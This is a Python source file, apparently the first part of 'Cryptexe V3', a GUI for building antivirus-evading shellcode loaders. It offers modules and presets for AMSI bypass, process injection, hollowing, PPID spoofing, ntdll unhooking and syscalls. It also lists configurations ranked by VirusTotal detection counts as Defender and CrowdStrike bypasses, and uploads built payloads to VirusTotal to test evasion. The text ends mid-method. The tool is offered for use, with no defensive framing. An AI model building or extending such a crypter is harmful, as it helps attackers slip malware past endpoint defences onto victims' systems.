#!/usr/bin/env python3"""Cryptexe  V3  —  redesigned UIVertical sidebar  |  Builder  |  Variants  |  Results  |  VirusTotal"""import subprocess, sys, os, threading, math, hashlibimport json, urllib.request, urllib.error, time, shutil, glob as _globfrom pathlib import Pathtry:    import customtkinter as ctkexcept ImportError:    print("[!] pip install customtkinter")    sys.exit(1)ctk.set_appearance_mode("dark")ctk.set_default_color_theme("blue")SHELLRUN_EXE  = Path(__file__).parent / "target" / "release" / "shellrun.exe"API_KEYS_FILE = Path(__file__).parent / "api_keys.json"APP_VERSION   = "3.0"APP_NAME      = "Cryptexe"VT_URL        = "https://www.virustotal.com/api/v3"# ── palette ──────────────────────────────────────────────────────────────────BG      = "#0a0a0f"BG2     = "#111118"BG3     = "#17171f"BG4     = "#1e1e28"SIDEBAR = "#0d0d14"BORDER  = "#252535"ACCENT  = "#5865f2"ACCENT2 = "#7289ff"GREEN   = "#23d18b"ORANGE  = "#f0a500"RED     = "#f04747"PURPLE  = "#9b59b6"DIM     = "#454560"TEXT    = "#e0e0f0"TEXT2   = "#666688"FONT    = "Segoe UI"MONO    = "Cascadia Code"def _load_vt_key():    try:        with open(API_KEYS_FILE, encoding="utf-8") as f:            return json.load(f).get("vt_api_key", "")    except Exception:        return ""def _save_vt_key(key: str):    try:        data = {}        if API_KEYS_FILE.exists():            with open(API_KEYS_FILE, encoding="utf-8") as f:                data = json.load(f)        data["vt_api_key"] = key        with open(API_KEYS_FILE, "w", encoding="utf-8") as f:            json.dump(data, f, indent=2)    except Exception:        passdef vt_get(key, path):    req = urllib.request.Request(VT_URL + path, headers={"x-apikey": key})    try:        with urllib.request.urlopen(req, timeout=20) as r:            return json.loads(r.read())    except urllib.error.HTTPError as e:        return {"error": e.code, "body": e.read().decode()}def vt_upload(key, filepath):    with open(filepath, "rb") as f:        data = f.read()    boundary = "----CryptexeBound"    body = (        ("--" + boundary + "\r\n").encode() +        b"Content-Disposition: form-data; name=\"file\"; filename=\"sample.exe\"\r\n" +        b"Content-Type: application/octet-stream\r\n\r\n" +        data + b"\r\n" +        ("--" + boundary + "--\r\n").encode()    )    req = urllib.request.Request(        VT_URL + "/files", data=body, method="POST",        headers={            "x-apikey": key,            "Content-Type": "multipart/form-data; boundary=" + boundary,        }    )    with urllib.request.urlopen(req, timeout=120) as r:        return json.loads(r.read())RESULTS = {    "w1":  ("af8ceca3568c25c07edbcf2226cf22d9601e64b6df83eb87ccb9991d1efa65cb", 0),    "w2":  ("77cfbcec505409cf0057f18d2611778aa6b4c8925b3a1912de30df7db1fef647", 0),    "w3":  ("5f595776d32406b327b12cba2cb162dd2691274d47e4c8fa8be9f4dce40482b6", 0),    "w4":  ("739dd9619ab300c108fa20cdfb53a467422556db13b5b31918cf7f08f6f11197", 0),    "w5":  ("e9e8846a9945c1afe4568e6047b84d33bdec7a38dd28be71d4ec72879b12c20e", 0),    "w6":  ("268762f81978ee68468f4d1f09bf416b9d4c42aa102645463f2af5ad7036c9a2", 0),    "w7":  ("7a5cb65e5f64a70f136dffeb7b5138bec12a8e20885cefa444d3ef6f9ff7a733", 0),    "w8":  ("93612ad0e21d20faf20461eaeba872a2805d628bd054a8c25be459fd302b293e", 0),    "w9":  ("e20c74b376cae915147e3cb656f0ef2c100bd34f042aa4afde85f6bf06762b08", 0),    "w10": ("b5c15211b2b63bdb71703bfe760a1a03a0ffce72bcea20fc41435d146176e403", 0),}MODULES = [    # Base    ("strenc",   "XOR Encrypt",   GREEN,  True,  "XOR-шифрование шеллкода"),    ("apihook",  "API Hook",      GREEN,  True,  "Перехват WinAPI"),    ("randkey",  "Rand Key",      GREEN,  True,  "Случайный ключ шифрования"),    ("junkcode", "Junk Code",     GREEN,  True,  "Добавление мусорного кода"),    # AMSI bypass    ("amasig",   "AMSI Patch",    ACCENT2,False, "Патч AMSI сигнатуры"),    ("hwbp",     "HWBP AMSI",     ACCENT2,False, "Hardware BP обход AMSI"),    # Anti-emulation    ("delay",    "Anti-Emul",     PURPLE, False, "Задержка против эмуляции"),    # Anti-signature    ("xormap",   "XorMap",        ORANGE, False, "XOR маппинг PE секций"),    ("patchpe",  "Patch PE hdr",  ORANGE, False, "Патч PE заголовка"),    # Execution    ("inject",   "Inject",        ORANGE, False, "Инъекция в процесс"),    ("apc",      "APC EarlyBird", ORANGE, False, "APC EarlyBird инъекция"),    ("indirect", "Indirect Sysc", ORANGE, False, "Непрямые системные вызовы"),    ("ntmap",    "ntdll Unhook",  ORANGE, False, "Снятие хуков ntdll"),    ("fiber",    "Fibers",        ORANGE, False, "Выполнение через Fibers"),    ("stomping", "Stomping",      ORANGE, False, "Module stomping"),    ("hollow",   "Hollowing",     ORANGE, False, "Process hollowing"),    ("ppid",     "PPID Spoof",    ORANGE, False, "Подмена PPID"),    ("sleep",    "Sleep Obf",     ORANGE, False, "Обфускация при Sleep"),    ("syscall",  "Syscall",       ORANGE, False, "Прямые syscall"),    # Misc    ("nameobf",  "Name Obf",      DIM,    False, "Обфускация имён"),    ("garbage",  "Garbage",       DIM,    False, "Мусорные данные"),]MOD_GROUPS = [    ("BASE",        ["strenc","apihook","randkey","junkcode"]),    ("AMSI BYPASS", ["amasig","hwbp"]),    ("ANTI-EMUL",   ["delay"]),    ("ANTI-SIG",    ["xormap","patchpe"]),    ("EXECUTION",   ["inject","apc","indirect","ntmap","fiber","stomping","hollow","ppid","sleep","syscall"]),    ("MISC",        ["nameobf","garbage"]),]PRESETS = [    ("APC + Delay",     GREEN,  ["strenc","apihook","randkey","junkcode","apc","delay"]),    ("Inject + Delay",  GREEN,  ["strenc","apihook","randkey","junkcode","inject","delay"]),    ("XorMap + Delay",  GREEN,  ["strenc","apihook","randkey","junkcode","xormap","delay"]),    ("XorMap + APC",    GREEN,  ["strenc","apihook","randkey","junkcode","xormap","apc","delay"]),    ("Full Bypass",     ACCENT2,["strenc","apihook","randkey","junkcode","xormap","inject","amasig","delay"]),    ("Indirect+Del",    GREEN,  ["strenc","apihook","randkey","junkcode","indirect","delay"]),    ("HWBP+Delay",      GREEN,  ["strenc","apihook","randkey","junkcode","hwbp","delay"]),    ("Minimal",         DIM,    ["strenc","apihook"]),]# ── helpers ──────────────────────────────────────────────────────────────────def _frame(parent, fg=BG2, radius=12, **kw):    return ctk.CTkFrame(parent, fg_color=fg, corner_radius=radius, **kw)def _label(parent, text, size=12, bold=False, color=TEXT, mono=False, **kw):    font = ctk.CTkFont(MONO if mono else FONT, size, "bold" if bold else "normal")    return ctk.CTkLabel(parent, text=text, font=font, text_color=color, **kw)def _btn(parent, text, cmd, w=None, h=34, color=ACCENT, hover=None, tcolor="#ffffff", radius=8, **kw):    return ctk.CTkButton(        parent, text=text, command=cmd,        width=w or 0, height=h,        fg_color=color, hover_color=hover or color,        text_color=tcolor, corner_radius=radius,        font=ctk.CTkFont(FONT, 12, "bold"), **kw    )def _section_label(parent, text):    f = ctk.CTkFrame(parent, fg_color="transparent")    f.pack(fill="x", padx=0, pady=(14, 4))    ctk.CTkFrame(f, fg_color=BORDER, height=1, corner_radius=0).pack(fill="x", side="left", expand=True, pady=6)    _label(f, f"  {text}  ", size=9, bold=True, color=DIM, mono=True).pack(side="left")    ctk.CTkFrame(f, fg_color=BORDER, height=1, corner_radius=0).pack(fill="x", side="left", expand=True, pady=6)    return f# ── Splash screen ─────────────────────────────────────────────────────────────class SplashScreen(ctk.CTkToplevel):    def __init__(self, master):        super().__init__(master)        self.overrideredirect(True)        w, h = 420, 220        sw = self.winfo_screenwidth()        sh = self.winfo_screenheight()        self.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")        self.configure(fg_color=BG3)        self.lift()        self.attributes("-topmost", True)        # Glow border effect via nested frames        outer = ctk.CTkFrame(self, fg_color=ACCENT, corner_radius=16)        outer.place(relx=0, rely=0, relwidth=1, relheight=1)        inner = ctk.CTkFrame(outer, fg_color=BG3, corner_radius=14)        inner.place(relx=0.005, rely=0.01, relwidth=0.99, relheight=0.98)        _label(inner, "⬡", size=36, bold=True, color=ACCENT2, mono=True).pack(pady=(30, 2))        _label(inner, "CRYPTEXE", size=22, bold=True, color=TEXT, mono=True).pack()        _label(inner, f"v{APP_VERSION}  —  Cursor-style loader", size=11, color=DIM).pack(pady=(4, 0))        self.bar = ctk.CTkProgressBar(inner, height=3, corner_radius=2,                                       fg_color=BG4, progress_color=ACCENT)        self.bar.pack(fill="x", padx=40, pady=(20, 0))        self.bar.set(0)        self._progress = 0        self._animate()    def _animate(self):        self._progress = min(1.0, self._progress + 0.025)        self.bar.set(self._progress)        if self._progress < 1.0:            self.after(30, self._animate)        else:            self.after(200, self.destroy)# ── Main App ──────────────────────────────────────────────────────────────────class CryptexeApp(ctk.CTk):    def __init__(self):        super().__init__()        self.title(f"Cryptexe  v{APP_VERSION}")        self.geometry("1120x720")        self.minsize(900, 580)        self.configure(fg_color=BG)        self.protocol("WM_DELETE_WINDOW", self.destroy)        self.withdraw()        self._active_tab = "builder"        self._preset_mods = []        self._pulse_dir = 1        self._pulse_val = 0        self._build_ui()        # show splash then main window        splash = SplashScreen(self)        self.after(1500, lambda: (self.deiconify(), self._check_exe()))    def _build_ui(self):        self.grid_rowconfigure(0, weight=1)        self.grid_columnconfigure(1, weight=1)        self._build_sidebar()        self._build_content()    # ── SIDEBAR ──────────────────────────────────────────────────────────────    def _build_sidebar(self):        sb = ctk.CTkFrame(self, fg_color=SIDEBAR, corner_radius=0, width=200)        sb.grid(row=0, column=0, sticky="nsew")        sb.grid_propagate(False)        sb.grid_rowconfigure(10, weight=1)        # Logo block        logo_f = ctk.CTkFrame(sb, fg_color=BG2, corner_radius=0, height=70)        logo_f.pack(fill="x")        logo_f.pack_propagate(False)        logo_inner = ctk.CTkFrame(logo_f, fg_color="transparent")        logo_inner.place(relx=0.5, rely=0.5, anchor="center")        _label(logo_inner, "⬡ ", size=22, bold=True, color=ACCENT, mono=True).pack(side="left")        col_f = ctk.CTkFrame(logo_inner, fg_color="transparent")        col_f.pack(side="left")        _label(col_f, "CRYPTEXE", size=13, bold=True, color=TEXT, mono=True).pack(anchor="w")        _label(col_f, f"v{APP_VERSION}", size=10, color=DIM, mono=True).pack(anchor="w")        # Divider        ctk.CTkFrame(sb, fg_color=BORDER, height=1, corner_radius=0).pack(fill="x")        # Nav items        self._tab_btns = {}        nav_items = [            ("builder",    "🔨", "Builder"),            ("variants",   "🧬", "Variants"),            ("results",    "📊", "Results"),            ("virustotal", "🛡", "VirusTotal"),        ]        nav_frame = ctk.CTkFrame(sb, fg_color="transparent")        nav_frame.pack(fill="x", pady=(12, 0))        for key, icon, label in nav_items:            btn = ctk.CTkButton(                nav_frame, text=f"  {icon}  {label}",                anchor="w", width=180, height=42,                corner_radius=8,                fg_color="transparent", hover_color=BG4,                text_color=TEXT2, font=ctk.CTkFont(FONT, 13),                command=lambda k=key: self._show(k),            )            btn.pack(fill="x", padx=10, pady=2)            self._tab_btns[key] = btn        # Status section at bottom        status_f = ctk.CTkFrame(sb, fg_color=BG2, corner_radius=10)        status_f.pack(fill="x", side="bottom", padx=10, pady=14)        _label(status_f, "STATUS", size=9, bold=True, color=DIM, mono=True               ).pack(anchor="w", padx=12, pady=(10, 2))        self.status_pill = _label(status_f, "● Ready", size=11, color=GREEN, mono=True)        self.status_pill.pack(anchor="w", padx=12, pady=(0, 10))        # exe check indicator        self.exe_pill = _label(sb, "", size=10, color=DIM)        self.exe_pill.pack(side="bottom", pady=(0, 4))        self._show("builder")    def _show(self, key):        self._active_tab = key        for k, v in self.views.items():            v.grid_forget()        self.views[key].grid(row=0, column=0, sticky="nsew")        for k, btn in self._tab_btns.items():            if k == key:                btn.configure(fg_color=BG4, text_color=TEXT,                               border_width=0)                # accent left line trick via fg_color contrast                btn.configure(fg_color=BG4, text_color=ACCENT2)            else:                btn.configure(fg_color="transparent", text_color=TEXT2)    # ── CONTENT area ─────────────────────────────────────────────────────────    def _build_content(self):        self.content = ctk.CTkFrame(self, fg_color=BG, corner_radius=0)        self.content.grid(row=0, column=1, sticky="nsew")        self.content.grid_rowconfigure(0, weight=1)        self.content.grid_columnconfigure(0, weight=1)        self.views = {}        self._build_builder()        self._build_variants()        self._build_results()        self._build_virustotal()    # ── BUILDER view ─────────────────────────────────────────────────────────    def _build_builder(self):        v = ctk.CTkScrollableFrame(self.content, fg_color=BG, corner_radius=0,                                   scrollbar_button_color=BORDER)        v.grid_columnconfigure(0, weight=1)        self.views["builder"] = v        # ── Page header        hdr = ctk.CTkFrame(v, fg_color="transparent")        hdr.grid(row=0, column=0, sticky="ew", padx=24, pady=(20, 4))        _label(hdr, "Builder", size=20, bold=True, color=TEXT).pack(side="left")        _label(hdr, "  Configure and compile your loader", size=12, color=DIM).pack(side="left", pady=4)        # ── Card: File inputs        fc = _frame(v, fg=BG3)        fc.grid(row=1, column=0, sticky="ew", padx=24, pady=(0, 12))        fc.grid_columnconfigure((0,1), weight=1)        _label(fc, "FILES", size=9, bold=True, color=DIM, mono=True               ).grid(row=0, column=0, columnspan=2, sticky="w", padx=16, pady=(14, 6))        # Shellcode        sc_f = _frame(fc, fg=BG4, radius=8)        sc_f.grid(row=1, column=0, sticky="nsew", padx=(14, 7), pady=(0, 14))        sc_f.grid_columnconfigure(0, weight=1)        _label(sc_f, "Shellcode", size=11, bold=True, color=ACCENT2               ).grid(row=0, column=0, columnspan=2, sticky="w", padx=12, pady=(10,2))        _label(sc_f, ".bin  .exe  .dll", size=10, color=DIM               ).grid(row=1, column=0, columnspan=2, sticky="w", padx=12, pady=(0,6))        self.entry_sc = ctk.CTkEntry(            sc_f, height=34, placeholder_text="No file selected…",            font=ctk.CTkFont(MONO, 11), fg_color=BG,            border_color=BORDER, text_color=GREEN,        )        self.entry_sc.grid(row=2, column=0, sticky="ew", padx=(12,6), pady=(0,12))        _btn(sc_f, "Browse", self._browse_sc, w=76, h=34, color=ACCENT, hover="#4a58d4"             ).grid(row=2, column=1, padx=(0,12), pady=(0,12))        # Output dir        out_f = _frame(fc, fg=BG4, radius=8)        out_f.grid(row=1, column=1, sticky="nsew", padx=(7,14), pady=(0,14))        out_f.grid_columnconfigure(0, weight=1)        _label(out_f, "Output Directory", size=11, bold=True, color=ACCENT2               ).grid(row=0, column=0, columnspan=2, sticky="w", padx=12, pady=(10,2))        _label(out_f, "Where to save .exe", size=10, color=DIM               ).grid(row=1, column=0, columnspan=2, sticky="w", padx=12, pady=(0,6))        self.entry_out = ctk.CTkEntry(            out_f, height=34, placeholder_text="No directory selected…",            font=ctk.CTkFont(MONO, 11), fg_color=BG,            border_color=BORDER, text_color=GREEN,        )        self.entry_out.grid(row=2, column=0, sticky="ew", padx=(12,6), pady=(0,12))        _btn(out_f, "Browse", self._browse_out, w=76, h=34, color=ACCENT, hover="#4a58d4"             ).grid(row=2, column=1, padx=(0,12), pady=(0,12))        # ── Card: Presets        pc = _frame(v, fg=BG3)        pc.grid(row=2, column=0, sticky="ew", padx=24, pady=(0, 12))        _label(pc, "PRESETS", size=9, bold=True, color=DIM, mono=True               ).pack(anchor="w", padx=16, pady=(14, 8))        pw = ctk.CTkFrame(pc, fg_color="transparent")        pw.pack(fill="x", padx=12, pady=(0, 12))        for label, color, mods in PRESETS:            _btn(pw, label,                 lambda m=mods, l=label: self._apply_preset(m, l),                 w=120, h=30, color=BG4, hover=BG2, tcolor=color, radius=6                 ).pack(side="left", padx=4)        # ── Card: Modules        mc = _frame(v, fg=BG3)        mc.grid(row=3, column=0, sticky="ew", padx=24, pady=(0, 12))        _label(mc, "MODULES", size=9, bold=True, color=DIM, mono=True               ).pack(anchor="w", padx=16, pady=(14, 4))        self.mod_switches = {}        mod_lookup = {mid: (label, color, default, tip) for mid, label, color, default, tip in MODULES}        for grp_name, grp_mids in MOD_GROUPS:            _section_label(mc, grp_name)            gf = ctk.CTkFrame(mc, fg_color="transparent")            gf.pack(fill="x", padx=12, pady=(0, 4))            for col_i, mid in enumerate(grp_mids):                if mid not in mod_lookup:                    continue                label, color, default, tip = mod_lookup[mid]                sw = ctk.CTkSwitch(                    gf, text=label,                    font=ctk.CTkFont(FONT, 11),                    onvalue="1", offvalue="0",                    fg_color=BG4, progress_color=color,                    button_color=BORDER, button_hover_color=DIM,                    text_color=TEXT, height=30,                )                sw.grid(row=col_i // 4, column=col_i % 4, sticky="w", padx=10, pady=3)                gf.grid_columnconfigure(col_i % 4, weight=1)                if default:                    sw.select()                self.mod_switches[mid] = sw        ctk.CTkFrame(mc, fg_color="transparent", height=12).pack()        # ── Active modules count label        self.mods_count_label = _label(mc, "", size=10, color=DIM, mono=True)        self.mods_count_label.pack(anchor="e", padx=16, pady=(0, 10))        self._update_mod_count()        for sw in self.mod_switches.values():            sw.configure(command=self._update_mod_count)        # ── Build row        br = _frame(v, fg=BG3)        br.grid(row=4, column=0, sticky="ew", padx=24, pady=(0, 12))        br.grid_columnconfigure(0, weight=1)        self.btn_build = ctk.CTkButton(            br, text="▶  BUILD",            height=50, font=ctk.CTkFont(FONT, 16, "bold"),            fg_color=ACCENT, hover_color="#4a58d4",            text_color="#ffffff", corner_radius=10,            command=self._do_build,        )        self.btn_build.grid(row=0, column=0, sticky="ew", padx=(14,8), pady=14)        self.btn_vt_upload = ctk.CTkButton(            br, text="⬆ VT",            height=50, width=90,            font=ctk.CTkFont(FONT, 13, "bold"),            fg_color=BG4, hover_color=BG2,            text_color=ACCENT2, corner_radius=10,            command=self._do_vt_upload,        )        self.btn_vt_upload.grid(row=0, column=1, padx=(0,14), pady=14)        self.progress = ctk.CTkProgressBar(br, height=4, corner_radius=2,                                            fg_color=BG4, progress_color=ACCENT)        self.progress.grid(row=1, column=0, columnspan=2, sticky="ew", padx=14, pady=(0,10))        self.progress.set(0)        self.progress.grid_remove()        # ── Log        log_hdr = ctk.CTkFrame(v, fg_color="transparent")        log_hdr.grid(row=5, column=0, sticky="ew", padx=24, pady=(0, 4))        _label(log_hdr, "OUTPUT", size=9, bold=True, color=DIM, mono=True).pack(side="left")        _btn(log_hdr, "Clear", self._clear_log, w=60, h=26, color=BG3, hover=BORDER, tcolor=TEXT2).pack(side="right")        _btn(log_hdr, "Copy",  self._copy_log,  w=60, h=26, color=BG3, hover=BORDER, tcolor=TEXT2).pack(side="right", padx=(0,4))        self.log_box = ctk.CTkTextbox(            v, height=180,            font=ctk.CTkFont(MONO, 11),            fg_color=BG3, border_color=BORDER,            text_color=GREEN, border_width=1,            corner_radius=10, padx=12, pady=10,        )        self.log_box.grid(row=6, column=0, sticky="ew", padx=24, pady=(0, 20))        self.log_box.tag_config("ok",   foreground=GREEN)        self.log_box.tag_config("warn", foreground=ORANGE)        self.log_box.tag_config("err",  foreground=RED)        self.log_box.tag_config("dim",  foreground=TEXT2)        self.log_box.tag_config("blue", foreground=ACCENT2)        self._log("Cryptexe V3 ready  —  select shellcode, output dir, then BUILD", "dim")    def _update_mod_count(self):        active = sum(1 for sw in self.mod_switches.values() if sw.get() == "1")        self.mods_count_label.configure(text=f"{active} modules active")    # ── VARIANTS view ────────────────────────────────────────────────────────    def _build_variants(self):        v = ctk.CTkFrame(self.content, fg_color=BG, corner_radius=0)        v.grid_columnconfigure(0, weight=1)        v.grid_rowconfigure(1, weight=1)        self.views["variants"] = v        hdr = ctk.CTkFrame(v, fg_color="transparent")        hdr.grid(row=0, column=0, sticky="ew", padx=24, pady=(20, 8))        _label(hdr, "Variants", size=20, bold=True, color=TEXT).pack(side="left")        _label(hdr, "  VirusTotal tested configurations", size=12, color=DIM).pack(side="left", pady=4)        scroll = ctk.CTkScrollableFrame(v, fg_color="transparent",                                        scrollbar_button_color=BORDER)        scroll.grid(row=1, column=0, sticky="nsew", padx=20, pady=(0,16))        scroll.grid_columnconfigure(0, weight=1)        groups = [            ("0 / 75  ✓  Defender Bypass", GREEN, [                ("AMSI_BEST",   ["strenc","apihook","randkey","junkcode","amasig"],  "0/75"),                ("w1–w10",      ["strenc","apihook","randkey","junkcode"],           "0/75"),                ("strenc+api",  ["strenc","apihook"],                               "0/75"),            ]),            ("1 / 75  —  CrowdStrike only", ACCENT2, [                ("nameobf",  ["strenc","apihook","nameobf","junkcode"], "1/75"),                ("base01",   ["strenc","apihook","randkey"],            "1/75"),            ]),            ("2 / 75  —  CS + 1 AV", ORANGE, [                ("apc02",       ["strenc","randkey","junkcode","apc"], "2/75"),                ("strencpure",  ["strenc","randkey"],                  "2/75"),            ]),            ("⚠  AVOID  >3 detections", RED, [                ("hollow", ["strenc","apihook","randkey","junkcode","hollow"], "14/75"),                ("ppid",   ["strenc","apihook","randkey","junkcode","ppid"],   "10/75"),            ]),        ]        for g_label, g_color, items in groups:            card = _frame(scroll, fg=BG3)            card.pack(fill="x", pady=6)            hdr_f = ctk.CTkFrame(card, fg_color=BG4, corner_radius=10, height=40)            hdr_f.pack(fill="x")            hdr_f.pack_propagate(False)            ctk.CTkFrame(hdr_f, fg_color=g_color, width=4, corner_radius=2                         ).pack(side="left", fill="y", padx=(0,8))            _label(hdr_f, g_label, size=12, bold=True, color=g_color                   ).pack(side="left", padx=4, pady=8)            for label, mods, vt in items:                row = ctk.CTkFrame(card, fg_color="transparent")                row.pack(fill="x", padx=12, pady=5)                _btn(row, "Use", lambda m=mods, l=label: (                    self._apply_preset(m, l), self._show("builder")                ), w=52, h=28, color=ACCENT, hover="#4a58d4", radius=6                ).pack(side="left")                _label(row, f"  {label}", size=11, bold=True, color=TEXT                       ).pack(side="left")                _label(row, "  " + " + ".join(mods), size=10, color=DIM, mono=True                       ).pack(side="left")                vt_color = GREEN if vt.startswith("0") else (ORANGE if vt.startswith("1") or vt.startswith("2") else RED)                badge = ctk.CTkFrame(row, fg_color=BG4, corner_radius=6)                badge.pack(side="right", padx=8)                _label(badge, f" {vt} ", size=10, bold=True, color=vt_color, mono=True                       ).pack(padx=6, pady=3)    # ── RESULTS view ─────────────────────────────────────────────────────────    def _build_results(self):        v = ctk.CTkFrame(self.content, fg_color=BG, corner_radius=0)        v.grid_columnconfigure(0, weight=1)        v.grid_rowconfigure(1, weight=1)        self.views["results"] = v        hdr = ctk.CTkFrame(v, fg_color="transparent")        hdr.grid(row=0, column=0, sticky="ew", padx=24, pady=(20, 8))        _label(hdr, "Results", size=20, bold=True, color=TEXT).pack(side="left")        clean = sum(1 for _, d in RESULTS.values() if d == 0)        pill = ctk.CTkFrame(hdr, fg_color=BG3, corner_radius=12)        pill.pack(side="left", padx=14)        pill_c = GREEN if clean == len(RESULTS) else ORANGE        _label(pill, f" {clean}/{len(RESULTS)} clean ", size=11, bold=True, color=pill_c               ).pack(padx=8, pady=4)        scroll = ctk.CTkScrollableFrame(v, fg_color="transparent",                                        scrollbar_button_color=BORDER)        scroll.grid(row=1, column=0, sticky="nsew", padx=20, pady=(0,16))        scroll.grid_columnconfigure(0, weight=1)        col_hdr = _frame(scroll, fg=BG4, radius=8)        col_hdr.pack(fill="x", pady=(0, 6))        col_hdr.grid_columnconfigure(1, weight=1)        for ci, txt in enumerate(["Name", "SHA-256", "VT Score"]):            _label(col_hdr, txt, size=9, bold=True, color=DIM                   ).grid(row=0, column=ci, padx=14, pady=8, sticky="w")        for name, (sha, dets) in RESULTS.items():            row = _frame(scroll, fg=BG3, radius=8)            row.pack(fill="x", pady=2)            row.grid_columnconfigure(1, weight=1)            color = GREEN if dets == 0 else (ORANGE if dets <= 3 else RED)            vt_text = "0 / 75" if dets == 0 else f"{dets} / 75"            _label(row, name, size=11, bold=True, color=TEXT, mono=True                   ).grid(row=0, column=0, padx=(14,0), pady=10, sticky="w")            _label(row, sha[:52] + "…", size=10, color=DIM, mono=True                   ).grid(row=0, column=1, padx=10, pady=10, sticky="w")            badge = ctk.CTkFrame(row, fg_color=BG4, corner_radius=6)            badge.grid(row=0, column=2, padx=(0,14), pady=10, sticky="e")            _label(badge, f" {vt_text} ", size=10, bold=True, color=color, mono=True                   ).pack(padx=8, pady=4)    # ── VIRUSTOTAL view ───────────────────────────────────────────────────────    def _build_virustotal(self):        v = ctk.CTkFrame(self.content, fg_color=BG, corner_radius=0)        v.grid_columnconfigure(0, weight=1)        v.grid_rowconfigure(3, weight=1)        self.views["virustotal"] = v        hdr = ctk.CTkFrame(v, fg_color="transparent")        hdr.grid(row=0, column=0, sticky="ew", padx=24, pady=(20, 8))        _label(hdr, "VirusTotal", size=20, bold=True, color=TEXT).pack(side="left")        _label(hdr, "  Upload and scan files", size=12, color=DIM).pack(side="left", pady=4)        # API Key card        key_card = _frame(v, fg=BG3)        key_card.grid(row=1, column=0, sticky="ew", padx=24, pady=(0, 12))        key_card.grid_columnconfigure(0, weight=1)        _label(key_card, "API KEY", size=9, bold=True, color=DIM, mono=True               ).grid(row=0, column=0, columnspan=4, sticky="w", padx=16, pady=(14, 6))        self._vt_key_visible = False        self.vt_key_entry = ctk.CTkEntry(            key_card, height=38, show="•",            placeholder_text="Enter VirusTotal API key…",            font=ctk.CTkFont(MONO, 11), fg_color=BG,            border_color=BORDER, text_color=GREEN,        )        self.vt_key_entry.grid(row=1, column=0, sticky="ew", padx=(16,6), pady=(0,14))        saved_key = _load_vt_key()        if saved_key:            self.vt_key_entry.insert(0, saved_key)        self.btn_vt_show = _btn(key_card, "👁", self._vt_toggle_key,                                w=38, h=38, color=BG4, hover=BORDER, tcolor=TEXT2)        self.btn_vt_show.grid(row=1, column=1, padx=(0,4), pady=(0,14))        _btn(key_card, "Save",  self._vt_save_key,  w=70, h=38, color=BG4, hover=BORDER, tcolor=TEXT2             ).grid(row=1, column=2, padx=(0,4), pady=(0,14))        _btn(key_card, "Check", self._vt_check_key, w=80, h=38, color=ACCENT, hover="#4a58d4"             ).grid(row=1, column=3, padx=(0,16), pady=(0,14))        self.vt_key_status = _label(key_card, "", size=11, color=TEXT2, mono=True)        self.vt_key_status.grid(row=2, column=0, columnspan=4, sticky="w", padx=16, pady=(0,12))        # Upload card        up_card = _frame(v, fg=BG3)        up_card.grid(row=2, column=0, sticky="ew", padx=24, pady=(0, 12))        up_card.grid_columnconfigure(0, weight=1)        _label(up_card, "UPLOAD & SCAN", size=9, bold=True, color=DIM, mono=True               ).grid(row=0, column=0, columnspan=3, sticky="w", padx=16, pady=(14, 6))        self.vt_file_entry = ctk.CTkEntry(            up_card, height=38,            placeholder_text="Select .exe to scan…",            font=ctk.CTkFont(MONO, 11), fg_color=BG,            border_color=BORDER, text_color=GREEN,        )        self.vt_file_entry.grid(row=1, column=0, sticky="ew", padx=(16,6), pady=(0,14))        _btn(up_card, "Browse", self._vt_browse_file, w=80, h=38, color=BG4, hover=BORDER, tcolor=TEXT2             ).grid(row=1, column=1, padx=(0,6), pady=(0,14))        self.btn_vt_scan = _btn(up_card, "⬆  Upload & Scan", self._vt_start_scan,                                w=154, h=38, color=ACCENT, hover="#4a58d4")        self.btn_vt_scan.grid(row=1, column=2, padx=(0,16), pady=(0,14))        # Log        log_hdr = ctk.CTkFrame(v, fg_color="transparent")        log_hdr.grid(row=3, column=0, sticky="new", padx=24, pady=(0, 4))        _label(log_hdr, "SCAN LOG", size=9, bold=True, color=DIM, mono=True).pack(side="left")        _btn(log_hdr, "Clear", self._vt_clear_log, w=60, h=26, color=BG3, hover=BORDER, tcolor=TEXT2).pack(side="right")        self.vt_log = ctk.CTkTextbox(            v, font=ctk.CTkFont(MONO, 11),            fg_color=BG3, border_color=BORDER,            text_color=GREEN, border_width=1,            corner_radius=10, padx=12, pady=10,        )        self.vt_log.grid(row=4, column=0, sticky="nsew", padx=24, pady=(0,20))        v.grid_rowconfigure(4, weight=1)        self.vt_log.tag_config("ok",   foreground=GREEN)        self.vt_log.tag_config("warn", foreground=ORANGE)        self.vt_log.tag_config("err",  foreground=RED)        self.vt_log.tag_config("dim",  foreground=TEXT2)        self.vt_log.tag_config("blue", foreground=ACCENT2)        self._vt_log("VirusTotal scanner ready  —  enter API key and select file", "dim")    # ── VT helpers ────────────────────────────────────────────────────────────    def _vt_log(self, msg, tag="ok"):        ts = time.strftime("%H:%M:%S")        self.vt_log.insert("end", f"[{ts}] {msg}\n", tag)        self.vt_log.see("end")    def _vt_clear_log(self):        self.vt_log.delete("1.0", "end")    def _vt_browse_file(self):        from tkinter import filedialog        p = filedialog.askopenfilename(            title="Select file to scan",            filetypes=[("Executables", "*.exe *.dll *.bin"), ("All", "*.*")],        )        if p:            self.vt_file_entry.delete(0, "end")            self.vt_file_entry.insert(0, p)    def _vt_toggle_key(self):        self._vt_key_visible = not self._vt_key_visible        self.vt_key_entry.configure(show="" if self._vt_key_visible else "•")        self.btn_vt_show.configure(text_color=GREEN if self._vt_key_visible else TEXT2)    def _vt_save_key(self):        key = self.vt_key_entry.get().strip()        if not key:            self.vt_key_status.configure(text="⚠  Key is empty", text_color=ORANGE)            return        _save_vt_key(key)        self.vt_key_status.configure(text="✓  Key saved", text_color=GREEN)    def _vt_check_key(self):        key = self.vt_key_entry.get().strip()        if not key:            self.vt_key_status.configure(text="⚠  Enter key first", text_color=ORANGE)            return        self.vt_key_status.configure(text="…  Checking…", text_color=TEXT2)        def work():            resp = vt_get(key, "/users/me")            def done():                if "error" in resp:                    code = resp["error"]                    msgs = {401: "✗  Invalid API key (401)", 429: "⚠  Rate limited (429)"}                    self.vt_key_status.configure(                        text=msgs.get(code, f"✗  Error {code}"),                        text_color=RED if code != 429 else ORANGE                    )                else:                    uname = resp.get("data", {}).get("id", "unknown")                    daily = resp.get("data",{}).get("attributes",{}).get("quotas",{}).get("api_requests_daily",{})                    used  = daily.get("used", "?")                    total = daily.get("allowed", "?")                    self.vt_key_status.configure(                        text=f"✓  Valid  —  {uname}   Daily: {used}/{total}",                        text_color=GREEN,                    )                    self._vt_log(f"API key valid  —  user: {uname}  daily quota: {used}/{total}", "ok")            self.after(0, done)        